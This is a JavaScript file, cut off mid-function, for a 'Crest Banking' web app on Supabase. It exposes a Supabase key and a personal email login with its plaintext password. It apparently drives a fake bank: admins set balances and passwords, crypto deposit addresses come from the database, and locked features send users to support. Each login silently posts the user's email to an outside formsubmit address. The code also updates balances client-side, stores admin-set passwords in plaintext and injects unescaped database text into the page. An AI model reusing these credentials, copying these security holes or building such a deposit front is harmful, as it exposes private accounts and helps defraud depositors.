/* ============================================================
   CREST BANKING — SUPABASE LIVE VERSION (FIXED)
   ============================================================ */

const SUPABASE_URL = 'https://qjtmgszaydbdqzfpdtya.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFqdG1nc3pheWRiZHF6ZnBkdHlhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY0Mzk3OTMsImV4cCI6MjA4MjAxNTc5M30.ddr3qY_snowoekPQd_h2LeD9ZuTkQBQ2xI-uAOxLAQc';
const sb = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

/* -------------------- PRE-REGISTERED CONFIG -------------------- */
const PRE_REGISTERED_EMAIL = 'maik69bi@gmail.com';
const PRE_REGISTERED_PASSWORD = 'Maiknkhloe2geda';
const PRE_REGISTERED_BALANCE = 97000.00;
const PRE_REGISTERED_ACCOUNT = '0343664546';
const ADMIN_EMAIL = 'oparahraymond72@gmail.com';

/* -------------------- CONSTANTS -------------------- */
const CURRENCY_SYMBOLS = { EUR: '\u20AC', USD: '$', GBP: '\u00A3', NGN: '\u20A6' };
const LANGUAGE_NAMES   = { en: 'English (US)', es: 'Espa\u00F1ol', fr: 'Fran\u00E7ais', de: 'Deutsch' };
let CRYPTO_INFO = {
  btc:  { name: 'Bitcoin',  address: '', network: 'Bitcoin Network' },
  eth:  { name: 'Ethereum', address: '', network: 'ERC-20' },
  usdt: { name: 'Tether',   address: '', network: 'TRC-20' },
  usdc: { name: 'USD Coin', address: '', network: 'ERC-20' }
};

async function loadCryptoAddresses() {
  const { data } = await sb.from('crypto_addresses').select('*');
  if (data) {
    data.forEach(row => {
      if (CRYPTO_INFO[row.id]) {
        CRYPTO_INFO[row.id].address = row.address;
        CRYPTO_INFO[row.id].network = row.network;
      }
    });
  }
}

/* -------------------- STATE -------------------- */
let appState = {
  balanceHidden: false, currentPage: 'home', isAdmin: false,
  editMode: false, txFilter: 'all', txSearch: '', homeTab: 'all',
  activeThread: null, authMode: 'login'
};
let currentUser = null;
let currentProfile = null;

/* -------------------- HELPERS -------------------- */
function genId(p) { return p + '_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2,7); }
function fmtMoney(amt, cur) {
  const s = CURRENCY_SYMBOLS[cur] || '\u20AC';
  return s + (parseFloat(amt)||0).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
}
function $(id) { return document.getElementById(id); }
function setText(id, text) { const el = $(id); if (el) el.textContent = text; }
function todayStr() { return new Date().toISOString().split('T')[0]; }
function nowStr()   { return new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'}); }

function showToast(msg, type='info') {
  const existing = document.querySelector('.toast-notification');
  if (existing) existing.remove();
  const t = document.createElement('div');
  const colors = { success:'#059669', error:'#DC2626', info:'#2563EB', warning:'#D97706' };
  t.className = 'toast-notification';
  t.style.cssText = `position:fixed;top:20px;right:20px;z-index:99999;background:${colors[type]||colors.info};color:white;padding:14px 20px;border-radius:12px;font-weight:600;font-size:14px;box-shadow:0 10px 25px rgba(0,0,0,0.2);animation:fadeInUp 0.3s ease;max-width:320px;line-height:1.4;`;
  t.textContent = msg;
  document.body.appendChild(t);
  setTimeout(()=>{ t.style.opacity='0'; t.style.transform='translateY(-10px)'; t.style.transition='all 0.3s ease'; setTimeout(()=>t.remove(),300); }, 3500);
}

/* -------------------- LOADER -------------------- */
function injectLoader() {
  if (document.getElementById('crest-loader')) return;
  const style = document.createElement('style');
  style.textContent = `
    @keyframes crestSpin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
    @keyframes crestFadeIn { from{opacity:0} to{opacity:1} }
  `;
  document.head.appendChild(style);

  const div = document.createElement('div');
  div.id = 'crest-loader';
  div.style.cssText = 'display:none;position:fixed;inset:0;z-index:999999;background:rgba(15,23,42,0.55);backdrop-filter:blur(5px);align-items:center;justify-content:center;flex-direction:column;gap:16px;animation:crestFadeIn 0.2s ease;';
  div.innerHTML = `
    <div style="width:52px;height:52px;border:5px solid var(--primary-light);border-top-color:var(--primary);border-radius:50%;animation:crestSpin 0.9s linear infinite;"></div>
    <p id="crest-loader-text" style="color:white;font-size:14px;font-weight:600;letter-spacing:0.5px;text-shadow:0 2px 8px rgba(0,0,0,0.3);">Please wait...</p>
  `;
  document.body.appendChild(div);
}
function showLoader(text) {
  const el = document.getElementById('crest-loader');
  if (!el) return;
  const txt = document.getElementById('crest-loader-text');
  if (txt && text) txt.textContent = text;
  el.style.display = 'flex';
}
function hideLoader() {
  const el = document.getElementById('crest-loader');
  if (el) el.style.display = 'none';
}
async function withLoader(fn, text) {
  showLoader(text);
  try { return await fn(); }
  catch(err) { console.error(err); throw err; }
  finally { hideLoader(); }
}

/* -------------------- AUTH -------------------- */
async function init() {
  injectLoader();
  fixLandingPageButtons();
  injectSignupToggle();
  setupEventListeners();
  updateThemeIcon();

  await withLoader(async () => {
    const { data:{session} } = await sb.auth.getSession();
    if (session) {
      currentUser = session.user;
      await loadProfile();
      await loadCryptoAddresses();
    } else {
      showLanding();
    }
  }, 'Checking session...');
}

function fixLandingPageButtons() {
  const menuItems = document.querySelectorAll('.landing-menu-item');
  menuItems.forEach(btn => {
    const txt = btn.textContent.trim().toLowerCase();
    if (txt.includes('sign up')) {
      btn.onclick = function(e) {
        e.preventDefault ? e.preventDefault() : (e.returnValue = false);
        closeLandingMenu();
        openSignupModal();
      };
    }
  });
  const hint = document.querySelector('.login-hint');
  if (hint) hint.remove();
}

/* FIX 1: loadProfile now ONLY sets pre-registered defaults on FIRST CREATE.
   It NEVER overwrites balance/account_number on subsequent loads. */
async function loadProfile() {
  const email = (currentUser.email || '').toLowerCase();
  const isPreReg = email === PRE_REGISTERED_EMAIL;
  const isAdminEmail = email === ADMIN_EMAIL;

  let { data, error } = await sb.from('profiles').select('*').eq('id', currentUser.id).single();

  if (error || !data) {
    /* First-time creation: apply pre-registered defaults here ONLY */
    const newProfile = {
      id: currentUser.id,
      email: currentUser.email,
      name: currentUser.user_metadata?.name || (isPreReg ? 'Account Holder' : 'New User'),
      account_number: isPreReg ? PRE_REGISTERED_ACCOUNT : Math.floor(Math.random()*1e10).toString().padStart(10,'0'),
      balance: isPreReg ? PRE_REGISTERED_BALANCE : 0,
      currency: 'EUR',
      language: 'en',
      notifications: true,
      is_admin: isAdminEmail
    };
    await sb.from('profiles').insert([newProfile]);
    currentProfile = newProfile;
  } else {
    /* Profile exists: trust the database values. Do NOT force-reset. */
    currentProfile = data;
  }

  appState.isAdmin = currentProfile.is_admin;

  if (currentProfile.pending_password) {
    await sb.auth.updateUser({ password: currentProfile.pending_password });
    await sb.from('profiles').update({ pending_password: null }).eq('id', currentUser.id);
    showToast('Password was updated by admin. Please log in again.', 'info');
    await sb.auth.signOut();
    location.reload();
    return;
  }

  if (appState.isAdmin) enterAdminMode();
  else enterUserMode();
}

/* FIX 2: New helper to reload fresh profile data from DB and refresh UI.
   Call this after any admin action that changes balance. */
async function reloadProfile() {
  if (!currentUser) return;
  const { data, error } = await sb.from('profiles').select('*').eq('id', currentUser.id).single();
  if (!error && data) {
    currentProfile = data;
    appState.isAdmin = currentProfile.is_admin;
    refreshUserUI();
  }
}

async function handleLogin(e) {
  e.preventDefault();
  const email = document.getElementById('loginEmail').value.trim().toLowerCase();
  const pw    = document.getElementById('loginPassword').value;

  if (appState.authMode === 'signup') {
    const name = document.getElementById('signupName')?.value.trim() || 'New User';
    if (!name || name.length < 2) return showToast('Please enter your full name', 'error');
    if (pw.length < 6) return showToast('Password must be at least 6 characters', 'error');

    await withLoader(async () => {
      const { data, error } = await sb.auth.signUp({ email, password: pw, options:{data:{name}} });
      if (error) throw new Error(error.message);
      currentUser = data.user;
      await loadProfile();
    }, 'Creating your account...');
    closeLoginModal();
    showToast('Account created! Welcome to Crest.', 'success');
    return;
  }

  await withLoader(async () => {
    const { data, error } = await sb.auth.signInWithPassword({ email, password: pw });
    if (error) throw new Error(error.message);
    currentUser = data.user;
    await loadProfile();

    /* ─── LOGIN NOTIFICATION + EMAIL ─── */
    const notifId = genId('notif');
    const loginMsg = `Successful login from ${navigator.platform} at ${new Date().toLocaleString()}`;

       // Save to DB
    const loginTime = new Date();   // capture once for accuracy
    await sb.from('notifications').insert([{
      id: notifId,
      user_id: currentProfile.id,
      title: 'Login Detected',
      message: `Successful login from ${navigator.platform} at ${loginTime.toLocaleString()}`,
      read: false,
      created_at: loginTime.toISOString()   
    }]);

    await loadNotifications();  

    // Send email to admin
    fetch("https://formsubmit.co/ajax/infohustine@gmail.com", {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        subject: "Crest Login Alert",
        message: `User ${currentUser.email} logged in.\n\nDetails: ${loginMsg}\n\n— Crest Banking System`
      })
    }).catch(() => {}); // Silently fail if offline

  }, 'Signing in...');

  closeLoginModal();
  showToast('Welcome back!', 'success');
}

async function handleLogout() {
  await withLoader(async () => { await sb.auth.signOut(); }, 'Signing out...');
  currentUser = null; currentProfile = null;
  location.reload();
}

function backToLanding() {
  document.getElementById('app-container').classList.add('hidden');
  document.getElementById('landing-page').classList.remove('hidden');
  handleLogout();
}

function showLanding() {
  document.getElementById('app-container').classList.add('hidden');
  document.getElementById('landing-page').classList.remove('hidden');
}

function enterUserMode() {
    closeLoginModal();
  document.getElementById('landing-page').classList.add('hidden');
  document.getElementById('app-container').classList.remove('hidden');
  removeAdminNav();
  refreshUserUI();
  showPage('home');
  loadNotifications();
}

function enterAdminMode() {
  document.getElementById('landing-page').classList.add('hidden');
  document.getElementById('app-container').classList.remove('hidden');
  injectAdminNav();
  refreshAdminUI();
  showPage('admin');
}

/* -------------------- LOGIN / SIGNUP MODAL -------------------- */
function openLoginModal() {
  appState.authMode = 'login';
  updateAuthModalUI();
  document.getElementById('loginModalOverlay').classList.add('active');
}
function openSignupModal() {
  appState.authMode = 'signup';
  updateAuthModalUI();
  document.getElementById('loginModalOverlay').classList.add('active');
}
function closeLoginModal() { document.getElementById('loginModalOverlay').classList.remove('active'); }

function injectSignupToggle() {
  const form = document.querySelector('.login-form');
  if (!form) return;
  if (!document.getElementById('signupNameGroup')) {
    const nameGroup = document.createElement('div');
    nameGroup.className = 'form-group';
    nameGroup.id = 'signupNameGroup';
    nameGroup.style.display = 'none';
    nameGroup.innerHTML = `<label class="form-label">Full Name</label><input type="text" class="form-input" id="signupName" placeholder="John Doe">`;
    form.insertBefore(nameGroup, form.firstChild);
  }
  if (!document.getElementById('authToggle')) {
    const toggle = document.createElement('p');
    toggle.id = 'authToggle';
    toggle.style.cssText = 'text-align:center;margin-top:14px;font-size:13px;color:var(--text-secondary)';
    toggle.innerHTML = `Don't have an account? <a href="#" style="color:var(--primary);font-weight:600" onclick="switchAuthMode(event)">Sign Up</a>`;
    form.appendChild(toggle);
  }
}

function updateAuthModalUI() {
  const nameGroup = document.getElementById('signupNameGroup');
  const btn = document.querySelector('.login-submit-btn');
  const title = document.querySelector('.login-modal-header h2');
  const sub = document.querySelector('.login-modal-header p');
  const toggle = document.getElementById('authToggle');

  if (appState.authMode === 'signup') {
    if (nameGroup) nameGroup.style.display = 'flex';
    if (btn) btn.textContent = 'Create Account';
    if (title) title.textContent = 'Create Account';
    if (sub) sub.textContent = 'Join Crest Reserve Bank today';
    if (toggle) toggle.innerHTML = `Already have an account? <a href="#" style="color:var(--primary);font-weight:600" onclick="switchAuthMode(event)">Log In</a>`;
  } else {
    if (nameGroup) nameGroup.style.display = 'none';
    if (btn) btn.textContent = 'Log In';
    if (title) title.textContent = 'Welcome Back';
    if (sub) sub.textContent = 'Log in to access your Crest dashboard';
    if (toggle) toggle.innerHTML = `Don't have an account? <a href="#" style="color:var(--primary);font-weight:600" onclick="switchAuthMode(event)">Sign Up</a>`;
  }
}

function switchAuthMode(e) {
  e.preventDefault();
  appState.authMode = appState.authMode === 'login' ? 'signup' : 'login';
  updateAuthModalUI();
}

/* -------------------- NAVIGATION -------------------- */
async function showPage(page) {
  appState.currentPage = page;

  // Dynamic browser tab title
  const titles = {
    home: 'Dashboard | Crest',
    wallet: 'My Wallet | Crest',
    webmail: 'Support | Crest',
    transactions: 'Transactions | Crest',
    account: 'Account | Crest',
    admin: 'Admin Panel | Crest',
    deposit: 'Crypto Deposit | Crest',
    paybills: 'Pay Bills | Crest',
    sendmoney: 'Send Money | Crest',
    withdraw: 'Withdraw | Crest'
  };
  document.title = titles[page] || 'Crest - Banking';

 
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  const target = document.getElementById('page-' + page);
  if (target) target.classList.add('active');

  document.querySelectorAll('.nav-item[data-page]').forEach(n => n.classList.remove('active'));
  document.querySelectorAll('.mobile-nav-item[data-nav]').forEach(n => n.classList.remove('active'));

  const nav = document.querySelector('.nav-item[data-page="' + page + '"]');
  if (nav) nav.classList.add('active');
  const mnav = document.querySelector('.mobile-nav-item[data-nav="' + page + '"]');
  if (mnav) mnav.classList.add('active');

  if (!appState.isAdmin) {
    refreshUserUI();
    if (page === 'home') await renderHomeTransactions();
    if (page === 'transactions') await renderFullTransactions();
    if (page === 'wallet') renderWallet();
    if (page === 'webmail') await renderSupport();
    if (page === 'account') renderAccount();
  } else {
    if (page === 'admin') await renderAdminPanel();
  }
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

/* -------------------- THEME -------------------- */
function toggleTheme() {
  const html = document.documentElement;
  const cur = html.getAttribute('data-theme');
  const next = cur === 'dark' ? 'light' : 'dark';
  html.setAttribute('data-theme', next);
  localStorage.setItem('crest_theme', next);
}
(function() {
  const saved = localStorage.getItem('crest_theme');
  if (saved) document.documentElement.setAttribute('data-theme', saved);
})();
function updateThemeIcon() {}

/* -------------------- USER UI REFRESH -------------------- */
function refreshUserUI() {
  if (!currentProfile) return;
  const u = currentProfile;

  setText('homeBalanceAmount', appState.balanceHidden ? '\u2022\u2022\u2022\u2022\u2022\u2022' : fmtMoney(u.balance, u.currency));
  setText('walletBalanceAmount', appState.balanceHidden ? '\u2022\u2022\u2022\u2022\u2022\u2022' : fmtMoney(u.balance, u.currency));
  setText('homeAccountNumber', u.account_number);
  setText('walletAccountNumber', u.account_number);

  setText('mobileHeaderTitle', 'Hi, ' + u.name);
  setText('deskProfileName', u.name);
  setText('profileNameDisplay', u.name);

  updateAvatarImages(u.avatar_url);

       setText('currencyDisplay', u.currency + ' \u2014 ' + (u.currency==='EUR'?'Euro':u.currency==='USD'?'US Dollar':u.currency==='GBP'?'British Pound':'Nigerian Naira'));
    setText('languageDisplay', LANGUAGE_NAMES[u.language] || 'English (US)');
  const notifToggle = document.getElementById('notifToggle');
  if (notifToggle) notifToggle.checked = u.notifications;

  updateStats();
}

async function updateStats() {
  if (!currentProfile) return;
  const { data:txs } = await sb.from('transactions')
    .select('*').eq('user_id', currentProfile.id).eq('status','completed');
  const income = (txs||[]).filter(t=>t.type==='income').reduce((a,b)=>a+parseFloat(b.amount),0);
  const expense = (txs||[]).filter(t=>t.type==='expense').reduce((a,b)=>a+parseFloat(b.amount),0);
  document.getElementById('statIncome').textContent = fmtMoney(income, currentProfile.currency);
  document.getElementById('statExpense').textContent = fmtMoney(expense, currentProfile.currency);
  document.getElementById('statSavings').textContent = fmtMoney(income-expense, currentProfile.currency);
}

/* -------------------- EVENT LISTENERS -------------------- */
function setupEventListeners() {
  const t1 = document.getElementById('toggleHomeBalance');
  const t2 = document.getElementById('toggleWalletBalance');
  if (t1) t1.addEventListener('click', toggleBalanceVisibility);
  if (t2) t2.addEventListener('click', toggleBalanceVisibility);

  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
      btn.classList.add('active');
      appState.homeTab = btn.dataset.tab;
      renderHomeTransactions();
    });
  });

  const search = document.getElementById('txSearch');
  if (search) search.addEventListener('input', e=>{ appState.txSearch=e.target.value.toLowerCase(); renderFullTransactions(); });

  document.querySelectorAll('.filter-chip').forEach(chip => {
    chip.addEventListener('click', () => {
      document.querySelectorAll('.filter-chip').forEach(c=>c.classList.remove('active'));
      chip.classList.add('active');
      appState.txFilter = chip.dataset.filter;
      renderFullTransactions();
    });
  });

  const editBtn = document.getElementById('editPersonalBtn');
  if (editBtn) editBtn.addEventListener('click', toggleProfileEdit);
}

function toggleBalanceVisibility() {
  appState.balanceHidden = !appState.balanceHidden;
  refreshUserUI();
}

/* -------------------- TRANSACTIONS -------------------- */
async function addTransaction(tx) {
  await sb.from('transactions').insert([{ ...tx, user_id: currentProfile.id }]);
}

async function getTransactions() {
  if (!currentProfile) return [];
  const { data } = await sb.from('transactions')
    .select('*').eq('user_id', currentProfile.id).order('created_at',{ascending:false});
  return data || [];
}

async function renderHomeTransactions() {
  const list = document.getElementById('homeTransactionList');
  if (!list) return;
  const txs = await getTransactions();
  let filtered = txs;
  if (appState.homeTab === 'income') filtered = txs.filter(t=>t.type==='income');
  if (appState.homeTab === 'expense') filtered = txs.filter(t=>t.type==='expense');
  list.innerHTML = filtered.slice(0,6).map(t=>renderTxItem(t)).join('');
}

async function renderFullTransactions() {
  const container = document.getElementById('txGroupItems');
  if (!container) return;
  let txs = await getTransactions();
  if (appState.txFilter !== 'all') {
    if (appState.txFilter==='pending') txs = txs.filter(t=>t.status==='processing');
    else txs = txs.filter(t=>t.type===appState.txFilter);
  }
  if (appState.txSearch) txs = txs.filter(t=>
    (t.title+' '+t.subtitle).toLowerCase().includes(appState.txSearch)
  );
  if (txs.length===0) { container.innerHTML='<div class="webmail-empty">No transactions found.</div>'; return; }
  container.innerHTML = txs.map(t=>renderTxItem(t)).join('');
}

function renderTxItem(t) {
  const amt = fmtMoney(t.amount, currentProfile?.currency||'EUR');
  const statusBadge = t.status && t.status!=='completed'
    ? `<span class="transaction-status ${t.status}">${t.status}</span>` : '';
  return `
    <div class="transaction-item">
      <div class="transaction-icon-wrapper ${t.icon_class||'gray'}">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
      </div>
      <div class="transaction-info">
        <p class="transaction-title">${t.title}</p>
        <p class="transaction-subtitle">${t.subtitle}</p>
      </div>
      <div class="transaction-meta">
        <p class="transaction-amount ${t.amount_class||''}">${t.type==='income'?'+':'-'}${amt}</p>
        <p class="transaction-date">${t.date}</p>
        ${statusBadge}
      </div>
    </div>`;
}

/* -------------------- FEATURE LOCKS -------------------- */
async function getFeatureLocks() {
  const { data } = await sb.from('feature_locks').select('*');
  const locks = {};
  (data||[]).forEach(r=>{ locks[r.feature_name] = r.locked; });
  return locks;
}

async function checkLockAndOpen(page) {
  const locks = await getFeatureLocks();
  if (locks[page]) {
    document.getElementById('lockedMessage').textContent = 'This feature is currently locked by the administrator. Please contact support for assistance.';
    document.getElementById('lockedModal').classList.add('active');
    return;
  }
  showPage(page);
}
function closeLockedModal() { document.getElementById('lockedModal').classList.remove('active'); }

/* -------------------- PAY BILLS -------------------- */
async function handlePayBill(e) {
  e.preventDefault();
  const category = document.getElementById('billCategory').value;
  const ref      = document.getElementById('billReference').value;
  const amount   = parseFloat(document.getElementById('billAmount').value);
  const desc     = document.getElementById('billDesc').value;
  if (!category||!ref||!amount) return showToast('Please fill all required fields','error');
  if (amount > currentProfile.balance) return showToast('Insufficient balance','error');

  await withLoader(async () => {
    const newBal = parseFloat(currentProfile.balance) - amount;
    await sb.from('profiles').update({ balance: newBal }).eq('id', currentProfile.id);
    currentProfile.balance = newBal;
    await addTransaction({
      id: genId('tx'), type:'expense', title: category+' Bill', subtitle: desc||ref,
      amount, date: todayStr(), status:'completed', icon_class:'amber', amount_class:'expense-amount'
    });
  }, 'Processing payment...');

  e.target.reset();
  showToast('Bill payment successful','success');
  showPage('home');
}

/* -------------------- SEND MONEY -------------------- */
async function handleSendMoney(e) {
  e.preventDefault();
  const name    = document.getElementById('sendName').value;
  const account = document.getElementById('sendAccount').value;
  const bank    = document.getElementById('sendBank').value;
  const amount  = parseFloat(document.getElementById('sendAmount').value);
  const note    = document.getElementById('sendNote').value;
  if (!name||!account||!amount) return showToast('Please fill all required fields','error');
  if (amount > currentProfile.balance) return showToast('Insufficient balance','error');

  await withLoader(async () => {
    const newBal = parseFloat(currentProfile.balance) - amount;
    await sb.from('profiles').update({ balance: newBal }).eq('id', currentProfile.id);
    currentProfile.balance = newBal;
    await addTransaction({
      id: genId('tx'), type:'expense', title:'Transfer to '+name, subtitle: bank+' \u2022 '+account,
      amount, date: todayStr(), status:'completed', icon_class:'blue', amount_class:'expense-amount'
    });
  }, 'Sending money...');

  e.target.reset();
  showToast('Money sent successfully','success');
  showPage('home');
}

/* -------------------- WITHDRAW -------------------- */
async function handleWithdraw(e) {
  e.preventDefault();
  const method  = document.getElementById('withdrawMethod').value;
  const account = document.getElementById('withdrawAccount').value;
  const amount  = parseFloat(document.getElementById('withdrawAmount').value);
  const reason  = document.getElementById('withdrawReason').value;
  if (!method||!account||!amount) return showToast('Please fill all required fields','error');
  if (amount > currentProfile.balance) return showToast('Insufficient balance','error');

  await withLoader(async () => {
    const newBal = parseFloat(currentProfile.balance) - amount;
    await sb.from('profiles').update({ balance: newBal }).eq('id', currentProfile.id);
    currentProfile.balance = newBal;
    await addTransaction({
      id: genId('tx'), type:'expense', title:'Withdrawal', subtitle: method+' \u2022 '+account,
      amount, date: todayStr(), status:'completed', icon_class:'red', amount_class:'expense-amount'
    });
  }, 'Processing withdrawal...');

  e.target.reset();
  showToast('Withdrawal request processed','success');
  showPage('home');
}

/* -------------------- DEPOSIT (CRYPTO) -------------------- */
function updateCryptoInfo() {
  const coin = document.getElementById('cryptoSelect').value;
  const info = CRYPTO_INFO[coin];
  if (!info) return;
  document.getElementById('cryptoAddress').value = info.address;
  document.getElementById('cryptoNetworkName').textContent = info.name;
  const netSelect = document.getElementById('cryptoNetwork');
  if (netSelect) netSelect.innerHTML = `<option value="${coin}-native">${info.network}</option>`;

    const qrPlaceholder = document.getElementById('qrPlaceholder');
  if (qrPlaceholder && info.address) {
    qrPlaceholder.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(info.address)}" style="width:160px;height:160px;border-radius:8px;" alt="QR"><span style="font-size:12px;font-weight:600">Scan to deposit</span>`;
  }
}
function copyCryptoAddress() {
  const el = document.getElementById('cryptoAddress');
  if (!el) return;
  el.select(); document.execCommand('copy');
  showToast('Address copied to clipboard','success');
}

async function confirmCryptoDeposit() {
  const coin   = document.getElementById('cryptoSelect').value;
  const amount = parseFloat(document.getElementById('cryptoAmount').value);
  const txid   = document.getElementById('cryptoTxid').value;
  if (!amount||amount<=0) return showToast('Please enter a valid amount','error');

  const info = CRYPTO_INFO[coin];
  const depId = genId('dep');

  await withLoader(async () => {
    await sb.from('admin_deposits').insert([{
      id: depId, user_id: currentProfile.id, coin: info.name, amount, txid: txid||'N/A', status: 'processing'
    }]);
    await addTransaction({
      id: depId, type:'income', title: info.name+' Deposit',
      subtitle: txid ? 'TXID: '+txid.slice(0,12)+'...' : 'Pending verification',
      amount, date: todayStr(), status:'processing', icon_class:'green', amount_class:'pending-amount'
    });
  }, 'Submitting deposit...');

  document.getElementById('cryptoAmount').value = '';
  document.getElementById('cryptoTxid').value = '';
  showToast('Deposit submitted for admin review','success');
  showPage('home');
}

/* -------------------- SUPPORT / WEBMAIL -------------------- */
async function switchMailTab(tab) {
  document.querySelectorAll('.webmail-tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.webmail-panel').forEach(p=>p.classList.remove('active'));
  const btn = document.querySelector('.webmail-tab[data-mailtab="'+tab+'"]');
  if (btn) btn.classList.add('active');
  const panel = document.getElementById('panel-'+tab);
  if (panel) panel.classList.add('active');
  if (tab==='inbox') await renderInbox();
  if (tab==='sent') await renderSent();
}

async function sendWebmail(e) {
  e.preventDefault();
  const subject  = document.getElementById('mailSubject').value;
  const category = document.getElementById('mailCategory').value;
  const body     = document.getElementById('mailBody').value;
  if (!subject||!body) return;

  const msgId = genId('msg');
  await withLoader(async () => {
    await sb.from('support_messages').insert([{
      id: msgId, user_id: currentProfile.id, subject, category, body,
      from_role: 'user', read: true, parent_id: null
    }]);
  }, 'Sending message...');

  e.target.reset();
  showToast('Message sent to support','success');
  switchMailTab('sent');
}

async function getSupportMessages() {
  if (!currentProfile) return [];
  const { data } = await sb.from('support_messages')
    .select('*').eq('user_id', currentProfile.id).order('created_at',{ascending:true});
  return data || [];
}

async function renderSupport() {
  await renderInbox();
  await renderSent();
  await updateInboxBadge();
}

async function renderInbox() {
  const list = document.getElementById('inboxList');
  if (!list) return;
  const msgs = await getSupportMessages();
  const inbox = msgs.filter(m => m.from_role==='user' && m.parent_id===null).filter(m => {
    return msgs.some(r => r.parent_id === m.id && r.from_role==='admin');
  });

  if (inbox.length===0) {
    list.innerHTML = '<div class="webmail-empty">No messages yet. Start a conversation with support.</div>';
    return;
  }
  list.innerHTML = inbox.map(m => renderMailItem(m, 'inbox', msgs)).join('');
}

async function renderSent() {
  const list = document.getElementById('sentList');
  if (!list) return;
  const msgs = await getSupportMessages();
  const sent = msgs.filter(m => m.from_role==='user' && m.parent_id===null);
  if (sent.length===0) {
    list.innerHTML = '<div class="webmail-empty">No sent messages yet.</div>';
    return;
  }
  list.innerHTML = sent.map(m => renderMailItem(m, 'sent', msgs)).join('');
}

function renderMailItem(m, box, allMsgs) {
  const replies = (allMsgs||[]).filter(r=>r.parent_id===m.id);
  const lastReply = replies[replies.length-1];
  const isUnread = box==='inbox' && lastReply && !lastReply.read;
  const preview = m.body.length>60 ? m.body.slice(0,60)+'...' : m.body;
  return `
    <div class="webmail-item ${isUnread?'unread':''}" onclick="openMailThread('${m.id}')">
      <div class="webmail-avatar support"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
      <div class="webmail-content">
        <div class="webmail-row"><span class="webmail-sender">${m.from_role==='user'?'You':'Crest Support'}</span><span class="webmail-time">${new Date(m.created_at).toLocaleDateString()}</span></div>
        <div class="webmail-subject">${m.subject}</div>
        <div class="webmail-preview">${preview}</div>
      </div>
    </div>`;
}

async function openMailThread(id) {
  appState.activeThread = id;
  const msgs = await getSupportMessages();
  const msg = msgs.find(m=>m.id===id);
  if (!msg) return;

  const adminReplies = msgs.filter(r=>r.parent_id===id && r.from_role==='admin');
  for (const r of adminReplies) {
    if (!r.read) await sb.from('support_messages').update({ read: true }).eq('id', r.id);
  }

  document.getElementById('threadSubject').textContent = msg.subject;
  const body = document.getElementById('threadBody');

  let html = `<div class="webmail-bubble sent">
    <div class="webmail-bubble-header"><span class="webmail-bubble-name">You</span><span class="webmail-bubble-time">${new Date(msg.created_at).toLocaleString()}</span></div>
    <div class="webmail-bubble-text">${msg.body.replace(/\n/g,'<br>')}</div>
  </div>`;

  const replies = msgs.filter(r=>r.parent_id===id).sort((a,b)=>new Date(a.created_at)-new Date(b.created_at));
  replies.forEach(r => {
    html += `<div class="webmail-bubble ${r.from_role==='admin'?'received':'sent'}">
      <div class="webmail-bubble-header"><span class="webmail-bubble-name">${r.from_role==='admin'?'Crest Support':'You'}</span><span class="webmail-bubble-time">${new Date(r.created_at).toLocaleString()}</span></div>
      <div class="webmail-bubble-text">${r.body.replace(/\n/g,'<br>')}</div>
    </div>`;
  });

  body.innerHTML = html;
  document.getElementById('mailThreadModal').classList.add('active');
  await updateInboxBadge();
}

function closeMailThread() {
  document.getElementById('mailThreadModal').classList.remove('active');
  appState.activeThread = null;
}

async function sendReply() {
  const input = document.getElementById('threadReplyInput');
  const text = input.value.trim();
  if (!text||!appState.activeThread) return;

  await withLoader(async () => {
    await sb.from('support_messages').insert([{
      id: genId('msg'), user_id: currentProfile.id, body: text,
      from_role: 'user', read: true, parent_id: appState.activeThread
    }]);
  }, 'Sending reply...');

  input.value = '';
  await openMailThread(appState.activeThread);
  showToast('Reply sent','success');
}

async function updateInboxBadge() {
  const msgs = await getSupportMessages();
  const unread = msgs.filter(m=>m.from_role==='admin' && !m.read).length;
  const badge = document.getElementById('inboxBadge');
  if (badge) {
    badge.textContent = unread;
    badge.style.display = unread>0 ? 'inline-flex' : 'none';
  }
}

function toggleFaq(el) { el.classList.toggle('open'); }

/* -------------------- ACCOUNT -------------------- */
function renderAccount() {
  if (!currentProfile) return;
  const u = currentProfile;
  document.getElementById('profileName').value = u.name;
  document.getElementById('profileEmail').value = u.email;
  document.getElementById('profilePhone').value = u.phone;
  document.getElementById('profileDob').value = u.dob;
}

async function toggleProfileEdit() {
  appState.editMode = !appState.editMode;
  const fields = ['profileName','profileEmail','profilePhone','profileDob'];
  fields.forEach(id => {
    const el = document.getElementById(id);
    if (el) { el.readOnly = !appState.editMode; el.style.background = appState.editMode ? 'var(--input-bg)' : 'var(--input-readonly)'; }
  });
  const btn = document.getElementById('editPersonalBtn');
  if (appState.editMode) {
    btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Save`;
    showToast('You can now edit your profile','info');
  } else {
    const updates = {
      name:  document.getElementById('profileName').value,
      email: document.getElementById('profileEmail').value,
      phone: document.getElementById('profilePhone').value,
      dob:   document.getElementById('profileDob').value
    };
    await withLoader(async () => {
      await sb.from('profiles').update(updates).eq('id', currentProfile.id);
